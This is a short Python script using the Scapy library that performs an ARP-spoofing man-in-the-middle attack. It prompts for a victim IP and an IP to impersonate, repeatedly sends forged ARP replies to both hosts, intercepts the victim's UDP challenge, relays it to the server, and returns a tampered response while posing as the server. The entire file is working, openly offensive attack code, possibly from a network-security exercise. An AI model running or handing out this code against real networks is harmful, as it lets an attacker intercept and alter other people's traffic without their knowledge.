from scapy.all import *
import time
import sys

ROUTER_IP = "10.0.0.138"
MY_MAC = '7c:7a:91:3f:e2:b0'
#CLIENT_MAC1 = 'ac:ed:5c:66:3b:8b'
#SERVER_MAC2 = '60:e3:27:11:07:02'
APP_PORT = 8800
SPOOF_PORT = 8801


def filter_client(packet):
    return ((IP in packet) and (packet[IP].dst == SERVER_IP) and (packet[IP].src == CLIENT_IP))


def filter_server(packet):
    return ((IP in packet) and (ICMP not in packet) and (packet[IP].dst == MY_IP) and (packet[IP].src == SERVER_IP))


MY_IP = raw_input('What is your IP?\n')
CLIENT_IP = raw_input('IP you want to attack?\n')
SERVER_IP = raw_input('IP you want the victim to think you are?\n')

# pdst - the device we want to fool
# hwsrc and psrc - the combination of mac + IP we want to plant in the table

# Fool the victim - tell the victim we are the other computer
client_poison = Ether()/ARP(op="is-at", pdst = CLIENT_IP, hwsrc = MY_MAC, psrc= SERVER_IP)

# Fool the other computer - tell the other computer we are the victim
server_poison = Ether()/ARP(op="is-at", pdst = SERVER_IP, hwsrc = MY_MAC, psrc= CLIENT_IP)

# Fool the router - tell the router we are the victim computer
# packet1 = Ether()/ARP(op="is-at", pdst = ROUTER_IP, hwsrc = my_mac, psrc= COMP_TO_IMPERSONATE)
# Fool the victim computer - tell the victim we are the router
# packet2 = Ether()/ARP(op="is-at", pdst = COMP_TO_IMPERSONATE, hwsrc = my_mac, psrc= ROUTER_IP)

while True:
    sendp(server_poison)
    sendp(client_poison)
    # capture client challenge
    victim_packet = sniff(count=1, lfilter=filter_client, timeout=1)
    time.sleep(0.1)

    if (len(victim_packet) == 1):
        print('victim sent packet, sending to server')
        port = victim_packet[0][UDP].sport
        challenge = victim_packet[0][Raw].load
        mitm_to_server = Ether()/IP(dst=SERVER_IP, src=MY_IP)/UDP(dport=APP_PORT, sport=SPOOF_PORT)/challenge
        server_packet = []
        while (len(server_packet) != 1):
            sendp(mitm_to_server)
            server_packet = sniff(count=1, lfilter=filter_server, timeout=0.1)
            time.sleep(0.1)
            sendp(server_poison)
            sendp(client_poison)
        server_packet[0].show()
        response = server_packet[0][Raw].load.split()[0] + ' Barak'
        mitm_to_client = Ether()/IP(dst=CLIENT_IP, src=SERVER_IP)/UDP(dport=port, sport=APP_PORT)/response
        sendp(mitm_to_client)
        print ('MITM completed')
